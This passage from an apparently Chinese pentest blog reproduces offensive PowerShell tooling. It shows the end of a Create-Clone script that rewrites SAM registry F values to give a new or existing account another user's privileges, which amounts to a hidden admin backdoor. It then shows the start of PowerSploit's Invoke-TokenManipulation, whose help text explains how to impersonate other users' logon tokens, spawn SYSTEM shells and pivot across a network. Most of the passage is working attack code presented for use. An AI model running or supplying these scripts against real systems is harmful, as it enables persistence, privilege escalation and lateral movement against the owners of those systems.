        <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\<span class="token variable">$cukey</span> [1 17] "</span> <span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token variable">$env</span>:temp\f<span class="token punctuation">.</span>ini
        cmd <span class="token operator">/</span>c <span class="token string">" regini <span class="token variable">$env</span>:temp\f.ini"</span>
        <span class="token function">Remove-Item</span> <span class="token variable">$env</span>:temp\f<span class="token punctuation">.</span>ini
        <span class="token variable">$ureg</span> = <span class="token string">"HKLM:\SAM\SAM\Domains\Account\Users\<span class="token variable">$ukey</span>"</span> <span class="token punctuation">|</span><span class="token function">Out-String</span>
        <span class="token variable">$cureg</span> = <span class="token string">"HKLM:\SAM\SAM\Domains\Account\Users\<span class="token variable">$cukey</span>"</span> <span class="token punctuation">|</span><span class="token function">Out-String</span>
        <span class="token function">Write-Host</span> <span class="token string">"[*] Get clone user'F value"</span>
        <span class="token variable">$cuFreg</span> = <span class="token function">Get-Item</span> <span class="token operator">-</span>Path <span class="token variable">$cureg</span><span class="token punctuation">.</span>Trim<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token variable">$cuFvalue</span> = <span class="token variable">$cuFreg</span><span class="token punctuation">.</span>GetValue<span class="token punctuation">(</span><span class="token string">'F'</span><span class="token punctuation">)</span>
        <span class="token function">Write-Host</span> <span class="token string">"[*] Change user'F value"</span>
        <span class="token function">Set-ItemProperty</span> <span class="token operator">-</span>path <span class="token variable">$ureg</span><span class="token punctuation">.</span>Trim<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token operator">-</span>Name <span class="token string">"F"</span> <span class="token operator">-</span>value <span class="token variable">$cuFvalue</span>
        <span class="token variable">$outreg</span> = <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\<span class="token variable">$ukey</span>"</span>
        cmd <span class="token operator">/</span>c <span class="token string">"regedit /e <span class="token variable">$env</span>:temp\out.reg <span class="token variable">$outreg</span>.Trim()"</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> Main <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token punctuation">(</span><span class="token namespace">[Security.Principal.WindowsPrincipal]</span> <span class="token namespace">[Security.Principal.WindowsIdentity]</span>::GetCurrent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>IsInRole<span class="token punctuation">(</span><span class="token namespace">[Security.Principal.WindowsBuiltInRole]</span> <span class="token string">"Administrator"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token function">Write-Output</span> <span class="token string">"Script must be run as administrator"</span> 
            <span class="token keyword">break</span>
        <span class="token punctuation">}</span>
        <span class="token function">Write-Output</span> <span class="token string">"[*] Start"</span>
        <span class="token function">Write-Output</span> <span class="token string">"[*] Tring to change reg privilege !"</span>
        upReg
        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">Test-Path</span> <span class="token operator">-</span>path <span class="token string">"HKLM:\SAM\SAM\Domains\Account\Users\Names\<span class="token variable">$cu</span>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">Write-Host</span> <span class="token string">"[-] The User to Clone does not exist !"</span>
            <span class="token function">Write-Output</span> <span class="token string">"[*] Change reg privilege back !"</span>
            downReg
            <span class="token function">Write-Output</span> <span class="token string">"[*] Exiting !"</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">Test-Path</span> <span class="token operator">-</span>path <span class="token string">"HKLM:\SAM\SAM\Domains\Account\Users\Names\<span class="token variable">$u</span>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token variable">$tmp</span> = <span class="token string">"1"</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span><span class="token punctuation">{</span>
                <span class="token variable">$tmp</span> = <span class="token string">"0"</span>
            <span class="token punctuation">}</span>
            <span class="token function">Write-Output</span> <span class="token string">"[*] Create User..."</span>
            Create<span class="token operator">-</span>user <span class="token variable">$u</span> <span class="token variable">$p</span>
            <span class="token function">Write-Output</span> <span class="token string">"[*] Get User <span class="token variable">$u</span>'s  Key .."</span>
            <span class="token variable">$ukey</span> = GetUser<span class="token operator">-</span>Key <span class="token variable">$u</span> <span class="token punctuation">|</span><span class="token function">Out-String</span>
            <span class="token function">Write-Output</span> <span class="token string">"[*] Get User <span class="token variable">$cu</span>'s  Key .."</span>
            <span class="token variable">$cukey</span> = GetUser<span class="token operator">-</span>Key <span class="token variable">$cu</span> <span class="token punctuation">|</span><span class="token function">Out-String</span>
            <span class="token function">Write-Output</span> <span class="token string">"[*] Clone User.."</span>
            Clone <span class="token variable">$ukey</span> <span class="token variable">$cukey</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$tmp</span> <span class="token operator">-eq</span> 1 <span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token function">Write-Output</span> <span class="token string">"[*] Delete User.."</span>
                cmd <span class="token operator">/</span>c <span class="token string">"net User <span class="token variable">$u</span> /del "</span> <span class="token punctuation">|</span><span class="token function">Out-Null</span>
            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token function">Write-Output</span> <span class="token string">"[*] Don't need to delete.."</span><span class="token punctuation">}</span>
            cmd <span class="token operator">/</span>c <span class="token string">"regedit /s <span class="token variable">$env</span>:temp\<span class="token variable">$u</span>.reg"</span>
            cmd <span class="token operator">/</span>c <span class="token string">"regedit /s <span class="token variable">$env</span>:temp\out.reg"</span>
            <span class="token function">Remove-Item</span> <span class="token variable">$env</span>:temp\<span class="token operator">*</span><span class="token punctuation">.</span>reg
            <span class="token function">Write-Output</span> <span class="token string">"[*] Change reg privilege back !"</span>
            downreg
            <span class="token function">Write-Output</span> <span class="token string">"[*] Done"</span>
        <span class="token punctuation">}</span>      
    <span class="token punctuation">}</span>
    Main
<span class="token punctuation">}</span></code></pre>
<ul>
<li><p>脚本来源：<a href="https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Create-Clone.ps1" target="_blank" rel="noopener">Evilcg</a></p>
</li>
<li><p>运行条件：需要管理员权限</p>
</li>
</ul>
<p>Invoke-TokenManipulation.ps1脚本内容如下所示：</p>
<pre class=" language-powershell"><code class="language-powershell"><span class="token keyword">function</span> Invoke<span class="token operator">-</span>TokenManipulation
<span class="token punctuation">{</span>
<span class="token comment" spellcheck="true">&lt;#
.SYNOPSIS

This script requires Administrator privileges. It can enumerate the Logon Tokens available and use them to create new processes. This allows you to use
anothers users credentials over the network by creating a process with their logon token. This will work even with Windows 8.1 LSASS protections.
This functionality is very similar to the incognito tool (with some differences, and different use goals).

This script can also make the PowerShell thread impersonate another users Logon Token. Unfortunately this doesn't work well, because PowerShell
creates new threads to do things, and those threads will use the Primary token of the PowerShell process (your original token) and not the token
that one thread is impersonating. Because of this, you cannot use thread impersonation to impersonate a user and then use PowerShell remoting to connect
to another server as that user (it will authenticate using the primary token of the process, which is your original logon token).

Because of this limitation, the recommended way to use this script is to use CreateProcess to create a new PowerShell process with another users Logon 
Token, and then use this process to pivot. This works because the entire process is created using the other users Logon Token, so it will use their
credentials for the authentication.

IMPORTANT: If you are creating a process, by default this script will modify the ACL of the current users desktop to allow full control to "Everyone". 
This is done so that the UI of the process is shown. If you do not need the UI, use the -NoUI flag to prevent the ACL from being modified. This ACL
is not permenant, as in, when the current logs off the ACL is cleared. It is still preferrable to not modify things unless they need to be modified though,
so I created the NoUI flag. ALSO: When creating a process, the script will request SeSecurityPrivilege so it can enumerate and modify the ACL of the desktop.
This could show up in logs depending on the level of monitoring.


PERMISSIONS REQUIRED:
SeSecurityPrivilege: Needed if launching a process with a UI that needs to be rendered. Using the -NoUI flag blocks this.
SeAssignPrimaryTokenPrivilege : Needed if launching a process while the script is running in Session 0.


Important differences from incognito:
First of all, you should probably read the incognito white paper to understand what incognito does. If you use incognito, you'll notice it differentiates
between "Impersonation" and "Delegation" tokens. This is because incognito can be used in situations where you get remote code execution against a service
which has threads impersonating multiple users. Incognito can enumerate all tokens available to the service process, and impersonate them (which might allow
you to elevate privileges). This script must be run as administrator, and because you are already an administrator, the primary use of this script is for pivoting
without dumping credentials. 

In this situation, Impersonation vs Delegation does not matter because an administrator can turn any token in to a primary token (delegation rights). What does
matter is the logon type used to create the logon token. If a user connects using Network Logon (aka type 3 logon), the computer will not have any credentials for 
the user. Since the computer has no credentials associated with the token, it will not be possible to authenticate off-box with the token. All other logon types
should have credentials associated with them (such as Interactive logon, Service logon, Remote interactive logon, etc). Therefore, this script looks
for tokens which were created with desirable logon tokens (and only displays them by default).

In a nutshell, instead of worrying about "delegation vs impersonation" tokens, you should worry about NetworkLogon (bad) vs Non-NetworkLogon (good).


PowerSploit Function: Invoke-TokenManipulation
Author: Joe Bialek, Twitter: @JosephBialek
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Lists available logon tokens. Creates processes with other users logon tokens, and impersonates logon tokens in the current thread.

.PARAMETER Enumerate

Switch. Specifics to enumerate logon tokens available. By default this will only list unqiue usable tokens (not network-logon tokens).

.PARAMETER RevToSelf

Switch. Stops impersonating an alternate users Token.

.PARAMETER ShowAll

Switch. Enumerate all Logon Tokens (including non-unique tokens and NetworkLogon tokens).

.PARAMETER ImpersonateUser

Switch. Will impersonate an alternate users logon token in the PowerShell thread. Can specify the token to use by Username, ProcessId, or ThreadId.
    This mode is not recommended because PowerShell is heavily threaded and many actions won't be done in the current thread. Use CreateProcess instead.

.PARAMETER CreateProcess

Specify a process to create with an alternate users logon token. Can specify the token to use by Username, ProcessId, or ThreadId.

.PARAMETER WhoAmI

Switch. Displays the credentials the PowerShell thread is running under.

.PARAMETER Username

Specify the Token to use by username. This will choose a non-NetworkLogon token belonging to the user.

.PARAMETER ProcessId

Specify the Token to use by ProcessId. This will use the primary token of the process specified.

.PARAMETER Process

Specify the token to use by process object (will use the processId under the covers). This will impersonate the primary token of the process.

.PARAMETER ThreadId

Specify the Token to use by ThreadId. This will use the token of the thread specified.

.PARAMETER ProcessArgs

Specify the arguments to start the specified process with when using the -CreateProcess mode.

.PARAMETER NoUI

If you are creating a process which doesn't need a UI to be rendered, use this flag. This will prevent the script from modifying the Desktop ACL's of the 
current user. If this flag isn't set and -CreateProcess is used, this script will modify the ACL's of the current users desktop to allow full control
to "Everyone".

.PARAMETER PassThru

If you are creating a process, this will pass the System.Diagnostics.Process object to the pipeline.


.EXAMPLE

Invoke-TokenManipulation -Enumerate

Lists all unique usable tokens on the computer.

.EXAMPLE

Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "nt authority\system"

Spawns cmd.exe as SYSTEM.

.EXAMPLE

Invoke-TokenManipulation -ImpersonateUser -Username "nt authority\system"

Makes the current PowerShell thread impersonate SYSTEM.

.EXAMPLE

Invoke-TokenManipulation -CreateProcess "cmd.exe" -ProcessId 500

Spawns cmd.exe using the primary token belonging to process ID 500.

.EXAMPLE

Invoke-TokenManipulation -ShowAll

Lists all tokens available on the computer, including non-unique tokens and tokens created using NetworkLogon.

.EXAMPLE

Invoke-TokenManipulation -CreateProcess "cmd.exe" -ThreadId 500

Spawns cmd.exe using the token belonging to thread ID 500.

.EXAMPLE

Get-Process wininit | Invoke-TokenManipulation -CreateProcess "cmd.exe"

Spawns cmd.exe using the primary token of LSASS.exe. This pipes the output of Get-Process to the "-Process" parameter of the script.

.EXAMPLE

(Get-Process wininit | Invoke-TokenManipulation -CreateProcess "cmd.exe" -PassThru).WaitForExit()

Spawns cmd.exe using the primary token of LSASS.exe. Then holds the spawning PowerShell session until that process has exited.

.EXAMPLE

Get-Process wininit | Invoke-TokenManipulation -ImpersonateUser

Makes the current thread impersonate the lsass security token.

.NOTES
This script was inspired by incognito. 

Several of the functions used in this script were written by Matt Graeber(Twitter: @mattifestation, Blog: http://www.exploit-monday.com/).
BIG THANKS to Matt Graeber for helping debug.

.LINK

Blog: http://clymb3r.wordpress.com/
Github repo: https://github.com/clymb3r/PowerShell
Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/

#></span>

    <span class="token punctuation">[</span>CmdletBinding<span class="token punctuation">(</span>DefaultParameterSetName=<span class="token string">"Enumerate"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">Param</span><span class="token punctuation">(</span>
        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"Enumerate"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
        <span class="token namespace">[Switch]</span>
        <span class="token variable">$Enumerate</span><span class="token punctuation">,</span>

        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"RevToSelf"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
        <span class="token namespace">[Switch]</span>
        <span class="token variable">$RevToSelf</span><span class="token punctuation">,</span>

        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"ShowAll"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
        <span class="token namespace">[Switch]</span>
        <span class="token variable">$ShowAll</span><span class="token punctuation">,</span>

        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"ImpersonateUser"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
        <span class="token namespace">[Switch]</span>
        <span class="token variable">$ImpersonateUser</span><span class="token punctuation">,</span>

        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"CreateProcess"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
        <span class="token namespace">[String]</span>
        <span class="token variable">$CreateProcess</span><span class="token punctuation">,</span>

        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"WhoAmI"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
        <span class="token namespace">[Switch]</span>
        <span class="token variable">$WhoAmI</span><span class="token punctuation">,</span>

        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"ImpersonateUser"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"CreateProcess"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
        <span class="token namespace">[String]</span>
        <span class="token variable">$Username</span><span class="token punctuation">,</span>

        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"ImpersonateUser"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"CreateProcess"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
        <span class="token namespace">[Int]</span>
        <span class="token variable">$ProcessId</span><span class="token punctuation">,</span>

        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"ImpersonateUser"</span><span class="token punctuation">,</span> ValueFromPipeline=<span class="token boolean">$true</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"CreateProcess"</span><span class="token punctuation">,</span> ValueFromPipeline=<span class="token boolean">$true</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
        <span class="token namespace">[System.Diagnostics.Process]</span>
        <span class="token variable">$Process</span><span class="token punctuation">,</span>

        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"ImpersonateUser"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"CreateProcess"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
        <span class="token variable">$ThreadId</span><span class="token punctuation">,</span>

        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"CreateProcess"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
        <span class="token namespace">[String]</span>
        <span class="token variable">$ProcessArgs</span><span class="token punctuation">,</span>

        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"CreateProcess"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
        <span class="token namespace">[Switch]</span>
        <span class="token variable">$NoUI</span><span class="token punctuation">,</span>

        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"CreateProcess"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
        <span class="token namespace">[Switch]</span>
        <span class="token variable">$PassThru</span>
    <span class="token punctuation">)</span>

    <span class="token function">Set-StrictMode</span> <span class="token operator">-</span>Version 2

    <span class="token comment" spellcheck="true">#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/</span>
    <span class="token keyword">Function</span> Get<span class="token operator">-</span>DelegateType
    <span class="token punctuation">{</span>
        <span class="token keyword">Param</span>
        <span class="token punctuation">(</span>
            <span class="token namespace">[OutputType([Type]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

            <span class="token namespace">[Parameter( Position = 0)]</span>
            <span class="token namespace">[Type[]</span><span class="token punctuation">]</span>
            <span class="token variable">$Parameters</span> = <span class="token punctuation">(</span><span class="token function">New-Object</span> <span class="token function">Type</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>

            <span class="token namespace">[Parameter( Position = 1 )]</span>
            <span class="token namespace">[Type]</span>
            <span class="token variable">$ReturnType</span> = <span class="token namespace">[Void]</span>
        <span class="token punctuation">)</span>

        <span class="token variable">$Domain</span> = <span class="token namespace">[AppDomain]</span>::CurrentDomain
        <span class="token variable">$DynAssembly</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Reflection<span class="token punctuation">.</span>AssemblyName<span class="token punctuation">(</span><span class="token string">'ReflectedDelegate'</span><span class="token punctuation">)</span>
        <span class="token variable">$AssemblyBuilder</span> = <span class="token variable">$Domain</span><span class="token punctuation">.</span>DefineDynamicAssembly<span class="token punctuation">(</span><span class="token variable">$DynAssembly</span><span class="token punctuation">,</span> <span class="token namespace">[System.Reflection.Emit.AssemblyBuilderAccess]</span>::Run<span class="token punctuation">)</span>
        <span class="token variable">$ModuleBuilder</span> = <span class="token variable">$AssemblyBuilder</span><span class="token punctuation">.</span>DefineDynamicModule<span class="token punctuation">(</span><span class="token string">'InMemoryModule'</span><span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">)</span>
        <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'MyDelegateType'</span><span class="token punctuation">,</span> <span class="token string">'Class, Public, Sealed, AnsiClass, AutoClass'</span><span class="token punctuation">,</span> <span class="token namespace">[System.MulticastDelegate]</span><span class="token punctuation">)</span>
        <span class="token variable">$ConstructorBuilder</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineConstructor<span class="token punctuation">(</span><span class="token string">'RTSpecialName, HideBySig, Public'</span><span class="token punctuation">,</span> <span class="token namespace">[System.Reflection.CallingConventions]</span>::Standard<span class="token punctuation">,</span> <span class="token variable">$Parameters</span><span class="token punctuation">)</span>
        <span class="token variable">$ConstructorBuilder</span><span class="token punctuation">.</span>SetImplementationFlags<span class="token punctuation">(</span><span class="token string">'Runtime, Managed'</span><span class="token punctuation">)</span>
        <span class="token variable">$MethodBuilder</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineMethod<span class="token punctuation">(</span><span class="token string">'Invoke'</span><span class="token punctuation">,</span> <span class="token string">'Public, HideBySig, NewSlot, Virtual'</span><span class="token punctuation">,</span> <span class="token variable">$ReturnType</span><span class="token punctuation">,</span> <span class="token variable">$Parameters</span><span class="token punctuation">)</span>
        <span class="token variable">$MethodBuilder</span><span class="token punctuation">.</span>SetImplementationFlags<span class="token punctuation">(</span><span class="token string">'Runtime, Managed'</span><span class="token punctuation">)</span>

        <span class="token function">Write-Output</span> <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>


    <span class="token comment" spellcheck="true">#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/</span>
    <span class="token keyword">Function</span> Get<span class="token operator">-</span>ProcAddress
    <span class="token punctuation">{</span>
        <span class="token keyword">Param</span>
        <span class="token punctuation">(</span>
            <span class="token namespace">[OutputType([IntPtr]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

            <span class="token namespace">[Parameter( Position = 0, Mandatory = $True )]</span>
            <span class="token namespace">[String]</span>
            <span class="token variable">$Module</span><span class="token punctuation">,</span>

            <span class="token namespace">[Parameter( Position = 1, Mandatory = $True )]</span>
            <span class="token namespace">[String]</span>
            <span class="token variable">$Procedure</span>
        <span class="token punctuation">)</span>

        <span class="token comment" spellcheck="true"># Get a reference to System.dll in the GAC</span>
        <span class="token variable">$SystemAssembly</span> = <span class="token namespace">[AppDomain]</span>::CurrentDomain<span class="token punctuation">.</span>GetAssemblies<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">|</span>
            <span class="token function">Where-Object</span> <span class="token punctuation">{</span> <span class="token variable">$_</span><span class="token punctuation">.</span>GlobalAssemblyCache <span class="token operator">-And</span> <span class="token variable">$_</span><span class="token punctuation">.</span>Location<span class="token punctuation">.</span>Split<span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span>1<span class="token punctuation">]</span><span class="token punctuation">.</span>Equals<span class="token punctuation">(</span><span class="token string">'System.dll'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>
        <span class="token variable">$UnsafeNativeMethods</span> = <span class="token variable">$SystemAssembly</span><span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'Microsoft.Win32.UnsafeNativeMethods'</span><span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># Get a reference to the GetModuleHandle and GetProcAddress methods</span>
        <span class="token variable">$GetModuleHandle</span> = <span class="token variable">$UnsafeNativeMethods</span><span class="token punctuation">.</span>GetMethod<span class="token punctuation">(</span><span class="token string">'GetModuleHandle'</span><span class="token punctuation">)</span>
        <span class="token variable">$GetProcAddress</span> = <span class="token variable">$UnsafeNativeMethods</span><span class="token punctuation">.</span>GetMethod<span class="token punctuation">(</span><span class="token string">'GetProcAddress'</span><span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># Get a handle to the module specified</span>
        <span class="token variable">$Kern32Handle</span> = <span class="token variable">$GetModuleHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$null</span><span class="token punctuation">,</span> @<span class="token punctuation">(</span><span class="token variable">$Module</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token variable">$tmpPtr</span> = <span class="token function">New-Object</span> IntPtr
        <span class="token variable">$HandleRef</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>InteropServices<span class="token punctuation">.</span>HandleRef<span class="token punctuation">(</span><span class="token variable">$tmpPtr</span><span class="token punctuation">,</span> <span class="token variable">$Kern32Handle</span><span class="token punctuation">)</span>

        <span class="token comment" spellcheck="true"># Return the address of the function</span>
        <span class="token function">Write-Output</span> <span class="token variable">$GetProcAddress</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$null</span><span class="token punctuation">,</span> @<span class="token punctuation">(</span><span class="token namespace">[System.Runtime.InteropServices.HandleRef]</span><span class="token variable">$HandleRef</span><span class="token punctuation">,</span> <span class="token variable">$Procedure</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">###############################</span>
    <span class="token comment" spellcheck="true">#Win32Constants</span>
    <span class="token comment" spellcheck="true">###############################</span>
    <span class="token variable">$Constants</span> = @<span class="token punctuation">{</span>
        ACCESS_SYSTEM_SECURITY = 0x01000000
        READ_CONTROL = 0x00020000
        SYNCHRONIZE = 0x00100000
        STANDARD_RIGHTS_ALL = 0x001F0000
        TOKEN_QUERY = 8
        TOKEN_ADJUST_PRIVILEGES = 0x20
        ERROR_NO_TOKEN = 0x3f0
        SECURITY_DELEGATION = 3
        DACL_SECURITY_INFORMATION = 0x4
        ACCESS_ALLOWED_ACE_TYPE = 0x0
        STANDARD_RIGHTS_REQUIRED = 0x000F0000
        DESKTOP_GENERIC_ALL = 0x000F01FF
        WRITE_DAC = 0x00040000
        OBJECT_INHERIT_ACE = 0x1
        GRANT_ACCESS = 0x1
        TRUSTEE_IS_NAME = 0x1
        TRUSTEE_IS_SID = 0x0
        TRUSTEE_IS_USER = 0x1
        TRUSTEE_IS_WELL_KNOWN_GROUP = 0x5
        TRUSTEE_IS_GROUP = 0x2
        PROCESS_QUERY_INFORMATION = 0x400
        TOKEN_ASSIGN_PRIMARY = 0x1
        TOKEN_DUPLICATE = 0x2
        TOKEN_IMPERSONATE = 0x4
        TOKEN_QUERY_SOURCE = 0x10
        STANDARD_RIGHTS_READ = 0x20000
        TokenStatistics = 10
        TOKEN_ALL_ACCESS = 0xf01ff
        MAXIMUM_ALLOWED = 0x02000000
        THREAD_ALL_ACCESS = 0x1f03ff
        ERROR_INVALID_PARAMETER = 0x57
        LOGON_NETCREDENTIALS_ONLY = 0x2
        SE_PRIVILEGE_ENABLED = 0x2
        SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x1
        SE_PRIVILEGE_REMOVED = 0x4
    <span class="token punctuation">}</span>

    <span class="token variable">$Win32Constants</span> = <span class="token function">New-Object</span> PSObject <span class="token operator">-</span>Property <span class="token variable">$Constants</span>
    <span class="token comment" spellcheck="true">###############################</span>


    <span class="token comment" spellcheck="true">###############################</span>
    <span class="token comment" spellcheck="true">#Win32Structures</span>
    <span class="token comment" spellcheck="true">###############################</span>
    <span class="token comment" spellcheck="true">#Define all the structures/enums that will be used</span>
    <span class="token comment" spellcheck="true">#    This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html</span>
    <span class="token variable">$Domain</span> = <span class="token namespace">[AppDomain]</span>::CurrentDomain
    <span class="token variable">$DynamicAssembly</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Reflection<span class="token punctuation">.</span>AssemblyName<span class="token punctuation">(</span><span class="token string">'DynamicAssembly'</span><span class="token punctuation">)</span>
    <span class="token variable">$AssemblyBuilder</span> = <span class="token variable">$Domain</span><span class="token punctuation">.</span>DefineDynamicAssembly<span class="token punctuation">(</span><span class="token variable">$DynamicAssembly</span><span class="token punctuation">,</span> <span class="token namespace">[System.Reflection.Emit.AssemblyBuilderAccess]</span>::Run<span class="token punctuation">)</span>
    <span class="token variable">$ModuleBuilder</span> = <span class="token variable">$AssemblyBuilder</span><span class="token punctuation">.</span>DefineDynamicModule<span class="token punctuation">(</span><span class="token string">'DynamicModule'</span><span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">)</span>
    <span class="token variable">$ConstructorInfo</span> = <span class="token namespace">[System.Runtime.InteropServices.MarshalAsAttribute]</span><span class="token punctuation">.</span>GetConstructors<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>0<span class="token punctuation">]</span>

    <span class="token comment" spellcheck="true">#ENUMs</span>
    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineEnum<span class="token punctuation">(</span><span class="token string">'TOKEN_INFORMATION_CLASS'</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">)</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenUser'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 1<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenGroups'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 2<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenPrivileges'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 3<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenOwner'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 4<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
